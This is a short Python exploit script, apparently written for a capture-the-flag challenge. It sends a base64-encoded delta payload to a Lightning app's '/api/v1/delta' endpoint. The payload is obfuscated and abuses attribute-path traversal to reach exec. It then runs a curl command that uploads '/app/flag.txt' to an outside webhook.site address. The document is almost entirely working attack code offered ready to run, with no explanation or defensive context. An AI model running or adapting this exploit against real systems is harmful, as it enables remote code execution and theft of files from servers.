import requests, time, base64

server_host = 'http://ml-api.pytorch-lab.internal:7501'

def send_delta(d):
    try:
        r = requests.post(
            server_host + '/api/v1/delta',
            headers={
                'x-lightning-type': '1',
                'x-lightning-session-uuid': '1',
                'x-lightning-session-id': '1'
            },
            json={"delta": d},
            timeout=10
        )
        # Print status + message
        print(f"[+] Response status: {r.status_code}")
        ct = r.headers.get("Content-Type", "")
        if "application/json" in ct.lower():
            try:
                print(f"[+] Response JSON: {r.json()}")
            except Exception:
                print(f"[+] Response body: {r.text}")
        else:
            print(f"[+] Response body: {r.text}")
        return r
    except requests.RequestException as e:
        print(f"[!] Request error: {e}")

PAYLOAD_B64 = "fVgPAAAAYXR0cmlidXRlX2FkZGVkfShjYnVpbHRpbnMKc3RyCnEAKFgQAAAAcm9vdFsnZnVuY3Rpb24nXXRSY2NvbGxlY3Rpb25zCm5hbWVkdHVwbGUKaAAoWBkAAAByb290WydieXBhc3NfaXNpbnN0YW5jZSdddFJjb3JkZXJlZF9zZXQKT3JkZXJlZFNldApxAWgAKFgtAAAAcm9vdFsnYnlwYXNzX2lzaW5zdGFuY2UnXS4nX19pbnN0YW5jZWNoZWNrX18ndFJoAGgAKFhWAAAAcm9vdFsnZnVuY3Rpb24nXS4nX19nbG9iYWxzX18nWydfc3lzJ10ubW9kdWxlc1snbGlnaHRuaW5nLmFwcCddLmNvcmUuYXBwLl9EZWx0YVJlcXVlc3R0UmgAaAAoWE8AAAByb290WydmdW5jdGlvbiddLidfX2dsb2JhbHNfXydbJ19zeXMnXS5tb2R1bGVzWydsaWdodG5pbmcuYXBwJ10uc3RydWN0dXJlcy5EaWN0dFJjYnVpbHRpbnMKZGljdApoAChYPgAAAHJvb3RbJ2Z1bmN0aW9uJ10uJ19fZ2xvYmFsc19fJ1snX3N5cyddLm1vZHVsZXNbJ3R5cGluZyddLlVuaW9udFJjYnVpbHRpbnMKbGlzdApoAChYUgAAAHJvb3RbJ2Z1bmN0aW9uJ10uJ19fZ2xvYmFsc19fJ1snX3N5cyddLm1vZHVsZXNbJ2xpZ2h0bmluZy5hcHAnXS5jb3JlLkxpZ2h0bmluZ0Zsb3d0UmgBKVJoAChYXgAAAHJvb3RbJ2Z1bmN0aW9uJ10uJ19fZ2xvYmFsc19fJ1snX3N5cyddLm1vZHVsZXNbJ2xpZ2h0bmluZy5hcHAnXS51dGlsaXRpZXMudHlwZXMuQ29tcG9uZW50VHVwbGV0UmgBKVJoAChYbAAAAHJvb3RbJ2Z1bmN0aW9uJ10uJ19fZ2xvYmFsc19fJ1snX3N5cyddLm1vZHVsZXNbJ2xpZ2h0bmluZy5hcHAnXS5jb3JlLmZsb3cuTGlnaHRuaW5nRmxvdy5fSU5URVJOQUxfU1RBVEVfVkFSU3RSKWgAKFhjAAAAcm9vdFsnZnVuY3Rpb24nXS4nX19nbG9iYWxzX18nWydfc3lzJ10ubW9kdWxlc1snbGlnaHRuaW5nLmFwcCddLnV0aWxpdGllcy5jb21tYW5kcy5iYXNlLl9BUElSZXF1ZXN0dFJoASlSaAAoWGQAAAByb290WydmdW5jdGlvbiddLidfX2dsb2JhbHNfXydbJ19zeXMnXS5tb2R1bGVzWydsaWdodG5pbmcuYXBwJ10uYXBpLnJlcXVlc3RfdHlwZXMuX0RlbHRhUmVxdWVzdC5uYW1ldFJYHwAAAHJvb3QuX19pbml0X18uX19idWlsdGluc19fLmV4ZWNoAChYawAAAHJvb3RbJ2Z1bmN0aW9uJ10uJ19fZ2xvYmFsc19fJ1snX3N5cyddLm1vZHVsZXNbJ2xpZ2h0bmluZy5hcHAnXS5hcGkucmVxdWVzdF90eXBlcy5fRGVsdGFSZXF1ZXN0Lm1ldGhvZF9uYW1ldFJYCAAAAF9fY2FsbF9faAAoWGQAAAByb290WydmdW5jdGlvbiddLidfX2dsb2JhbHNfXydbJ19zeXMnXS5tb2R1bGVzWydsaWdodG5pbmcuYXBwJ10uYXBpLnJlcXVlc3RfdHlwZXMuX0RlbHRhUmVxdWVzdC5hcmdzdFIoWHgCAABfX2ltcG9ydF9fKCdvcycpLnN5c3RlbSgnY3VybCAtWCBQT1NUIGh0dHBzOi8vd2ViaG9vay5zaXRlLyMhL3ZpZXcvNmZhODBjMjEtNjI3OC00MjY1LWI0MjQtZWM3MTY3ZWM1ZTU4IC1GICJmaWxlcz1AL2FwcC9mbGFnLnR4dCInKQppbXBvcnQgbGlnaHRuaW5nLCBzeXMKZnJvbSBsaWdodG5pbmcuYXBwLmFwaS5yZXF1ZXN0X3R5cGVzIGltcG9ydCBfRGVsdGFSZXF1ZXN0LCBfQVBJUmVxdWVzdApsaWdodG5pbmcuYXBwLmNvcmUuYXBwLl9EZWx0YVJlcXVlc3QgPSBfRGVsdGFSZXF1ZXN0CmZyb20gbGlnaHRuaW5nLmFwcC5zdHJ1Y3R1cmVzLmRpY3QgaW1wb3J0IERpY3QKbGlnaHRuaW5nLmFwcC5zdHJ1Y3R1cmVzLkRpY3QgPSBEaWN0CmZyb20gbGlnaHRuaW5nLmFwcC5jb3JlLmZsb3cgaW1wb3J0IExpZ2h0bmluZ0Zsb3cKbGlnaHRuaW5nLmFwcC5jb3JlLkxpZ2h0bmluZ0Zsb3cgPSBMaWdodG5pbmdGbG93CkxpZ2h0bmluZ0Zsb3cuX0lOVEVSTkFMX1NUQVRFX1ZBUlMgPSB7Il9wYXRocyIsICJfbGF5b3V0In0KbGlnaHRuaW5nLmFwcC51dGlsaXRpZXMuY29tbWFuZHMuYmFzZS5fQVBJUmVxdWVzdCA9IF9BUElSZXF1ZXN0CmRlbCBzeXMubW9kdWxlc1snbGlnaHRuaW5nLmFwcC51dGlsaXRpZXMudHlwZXMnXXRoAChYZgAAAHJvb3RbJ2Z1bmN0aW9uJ10uJ19fZ2xvYmFsc19fJ1snX3N5cyddLm1vZHVsZXNbJ2xpZ2h0bmluZy5hcHAnXS5hcGkucmVxdWVzdF90eXBlcy5fRGVsdGFSZXF1ZXN0Lmt3YXJnc3RSfWgAKFhiAAAAcm9vdFsnZnVuY3Rpb24nXS4nX19nbG9iYWxzX18nWydfc3lzJ10ubW9kdWxlc1snbGlnaHRuaW5nLmFwcCddLmFwaS5yZXF1ZXN0X3R5cGVzLl9EZWx0YVJlcXVlc3QuaWR0UlgEAAAAcm9vdHVzLg=="

decoded_payload = base64.b64decode(PAYLOAD_B64).decode('utf-8')

print("[*] Sending payload to /api/v1/delta ...")
send_delta(decoded_payload)

# Small delay to ensure payload is processed
time.sleep(0.2)
print("[*] Done.")
